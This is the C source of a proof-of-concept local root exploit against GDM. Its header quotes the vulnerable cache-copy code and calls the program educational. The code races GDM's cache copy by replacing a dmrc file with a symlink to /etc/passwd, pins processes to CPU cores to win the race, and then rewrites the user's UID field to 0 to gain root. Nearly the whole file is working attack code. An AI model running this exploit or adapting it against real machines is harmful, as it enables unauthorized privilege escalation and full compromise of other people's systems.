/* bambule-digitale II -- GDM local root exploit.
 *
 *
 * static gboolean
 * gdm_cache_copy_file (GdmSessionWorker *worker,
 *                    const char *userfilename,
 *                    const char *cachefilename)
 * [...]
 *
 *                res = g_file_copy (src_file,
 *                                   dst_file,
 *                                   G_FILE_COPY_OVERWRITE |
 *                                   G_FILE_COPY_NOFOLLOW_SYMLINKS,
 *                                   NULL,
 *                                   NULL,
 *                                   NULL,
 *                                   &error);
 *
 *                if (! res) {
 *                       g_warning ("Could not copy file to cache: %s",
 *                                  error->message);
 *                       g_error_free (error);
 *                } else {
 *                       chown (cachefilename,
 *                              worker->priv->uid,
 *                              worker->priv->gid);
 *                       g_chmod (cachefilename, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 *                       g_debug ("Copy successful");
 *                }
 * [...]
 *
 * and cachedir is user owned!
 *
 * POC! FOR EDUCATIONAL PURPOSES ONLY!!!
 *
 * Makes /etc/passwd owned by user and changes uid to 0. Run from login
 * shell and start/end a GDM session until success. The GDM session must at least
 * last 3 seconds! On a common multicore machine this should need just a few tries.
 */
#ifndef _GNU_SOURCE
#ifdef linux
#define _GNU_SOURCE
#endif
#endif

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/select.h>
#include <time.h>
#include <string.h>
#ifdef linux
#include <sys/syscall.h>
#include <sched.h>
#endif


#ifdef linux

int ncores = 1;

int get_cores()
{
	int n = 1;
	char buf[256];

	FILE *f = fopen("/proc/cpuinfo", "r");
	if (!f)
		return -1;

	for (;!feof(f);) {
		memset(buf, 0, sizeof(buf));
		if (fgets(buf, sizeof(buf), f) == NULL)
			break;
		if (strstr(buf, "processor"))
			++n;
	}

	fclose(f);
	return n - 1;
}


/* returns 1 of supporting multicore */
int adjust_cpuset()
{
	const char *pidfile = "/var/run/gdm.pid";
	char spid[32];
	pid_t gdm_pid = 0, pid = 0;
	FILE *f = NULL;
	int n = 0, i = 0;

	printf("[*] Trying setup multicore to win race ...\n");

	n = ncores;

	if (n <= 1)
		return -1;

	printf("[+] Found %d CPU cores.\n", n);

	if ((f = fopen(pidfile, "r")) == NULL) {
		if ((f = fopen("/var/run/gdm3.pid", "r")) == NULL)
			return -1;
	}

	memset(spid, 0, sizeof(spid));
	fgets(spid, sizeof(spid), f);
	fclose(f);

	if ((gdm_pid = atoi(spid)) <= 0)
		return -1;
	printf("[+] Found GDM with PID %d\n", gdm_pid);

	cpu_set_t *cpuset = CPU_ALLOC(n);
	if (!cpuset)
		return -1;

	size_t size = CPU_ALLOC_SIZE(n);
	CPU_ZERO_S(size, cpuset);

	if (sched_getaffinity(gdm_pid, size, cpuset) < 0) {
		CPU_FREE(cpuset);
		return -1;
	}

	for (i = 0; i < n; ++i) {
		if (CPU_ISSET_S(i, size, cpuset)) {
			printf("[+] GDM's cpuset includes node %d.\n", i);
		}
	}

	CPU_ZERO_S(size, cpuset);
	CPU_SET_S(0, size, cpuset);
	if (sched_setaffinity(getpid(), size, cpuset) < 0) {
		CPU_FREE(cpuset);
		return -1;
	}
	printf("[+] Bound process %d to core 0.\n", getpid());

	for (i = 1; i < n; ++i) {
		pid = fork();
		if (pid < 0) {
			CPU_FREE(cpuset);
			return -1;
		} else if (pid > 0)
			continue;
		CPU_ZERO_S(size, cpuset);
		CPU_SET_S(i, size, cpuset);
		if (sched_setaffinity(getpid(), size, cpuset) < 0) {
			CPU_FREE(cpuset);
			return -1;
		}
		printf("[+] Bound process %d to core %d.\n", getpid(), i);
		break;
	}

	CPU_FREE(cpuset);
	return 1;
}

#endif

void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


void patch_passwd()
{
	int fd;
	char buf[128], c;
	char *pwd = NULL, *ptr = NULL;
	struct stat st;
	off_t off = 0;

	if ((fd = open("/etc/passwd", O_RDWR)) < 0)
		die("[-] open");
	fstat(fd, &st);
	if ((pwd = malloc(st.st_size)) == NULL)
		die("[-] malloc");
	if (read(fd, pwd, st.st_size) != st.st_size)
		die("[-] read");
	snprintf(buf, sizeof(buf), "%s:x:", getenv("USER"));
	ptr = strstr(pwd, buf);
	if (!ptr)
		die("[-] Wrong /etc/passwd format");
	off = lseek(fd, ptr - pwd + strlen(buf), SEEK_SET);
	free(pwd);
	for (;;) {
		pread(fd, &c, 1, off);
		if (c == ':')
			break;
		write(fd, "0", 1);
		++off;
	}
	close(fd);
	sync();
}


void sig_pause(int x)
{
	return;
}


int main()
{
	char file1[1024], file2[1024];
	struct stat st;
	int r = 0, mc = 0;
	pid_t parent = getpid();

	printf("[**] Bambule Digitale II -- GDM local root exploit PoC.\n\n");

	snprintf(file1, sizeof(file1), "/var/cache/gdm/%s/dmrc", getenv("USER"));
	snprintf(file2, sizeof(file2), "/var/cache/gdm/%s/.lock", getenv("USER"));

	signal(SIGCHLD, SIG_IGN);
	signal(SIGUSR1, sig_pause);

	/* Having the parent doing final output, doesnt smash up
	 * stdout. So this is just cosmetics and could be done in
	 * end of main().
	 */
	if (fork() > 0) {
		pause();

		printf("[+] yummy! /etc/passwd world writable!\n");
		patch_passwd();
		unlink(file1);
		unlink(file2);
		printf("[+] 'su %s'.\n", getenv("USER"));
		exit(0);
	}

	ncores = get_cores();

	do {
		unlink(file1);
		unlink(file2);

#ifdef linux
		if ((mc = adjust_cpuset()) < 0)
			printf("[-] No multicore support. Trying anyway...\n");
#endif
		do {
			r = lstat(file1, &st);
		} while (r < 0);

		/* The first one wins the race and locks, all other
		 * exploiting threads exit
		 */
#ifdef linux
		if (mc == 1 && (r = syscall(SYS_open, file2, O_CREAT|O_EXCL|O_RDONLY, 0600)) < 0)
			exit(0);
		syscall(SYS_unlink, file1);
		syscall(SYS_symlink, "/etc/passwd", file1);
		close(r);
#else
		unlink(file1);
		symlink("/etc/passwd", file1);
#endif
		printf("[+] Process %d first.\n", getpid());
		memset(&st, 0, sizeof(st));
		sleep(3);
		stat("/etc/passwd", &st);
	} while (st.st_uid != getuid());

	kill(parent, SIGUSR1);

	/* Parent will do the job */
	return 0;
}

